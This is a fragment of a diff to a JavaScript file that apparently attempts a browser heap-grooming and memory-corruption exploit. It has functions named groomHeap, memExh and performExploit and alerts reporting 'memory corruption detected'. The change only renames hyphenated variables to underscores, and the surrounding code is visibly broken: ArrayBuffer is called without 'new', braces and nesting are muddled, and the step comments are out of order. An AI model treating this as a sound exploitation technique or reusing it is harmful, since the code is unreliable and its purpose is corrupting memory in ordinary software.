@@ -39,11 +39,11 @@ function groomHeap() {
 // Step 3: Memory Exhaustion Function
 function memExh() {
     let a = ArrayBuffer(512);
-    let se-a = new Uint8Array(a); // View it as an array of bytes
+    let se_a = new Uint8Array(a); // View it as an array of bytes
     let b = ArrayBuffer(512);
-    let se-b = new Uint8Array(b);
+    let se_b = new Uint8Array(b);
     let c = ArrayBuffer(512);
-    let se-c = new Uint8Array(c);
+    let se_c = new Uint8Array(c);
     let bufferArray = [];
     for (let i = 0; i < 2048; i++) { // Reduced iterations
         bufferArray.push(new ArrayBuffer(900000)); // Allocate smaller buffers
@@ -53,8 +53,8 @@ function memExh() {
             bufferArray = []; // Clear buffer array to exhaust memory
             let a = null;
              // Step 2: Fill with known data
-    for (let i = 0; i < se-a.length; i++) {
-        se-a[i] = 0x41; // Fill with 'A' 
+    for (let i = 0; i < se_a.length; i++) {
+        se_a[i] = 0x41; // Fill with 'A' 
         }
         }
     }
@@ -123,7 +123,7 @@ function performExploit() {
             alert("Memory corruption detected at index " + i + ": " + view[i]);
             break;
         }
-        alert("Memory buffer after grooming " + i + ": " + se-c[i]);
+        alert("Memory buffer after grooming " + i + ": " + se_c[i]);
     }
 }
 }
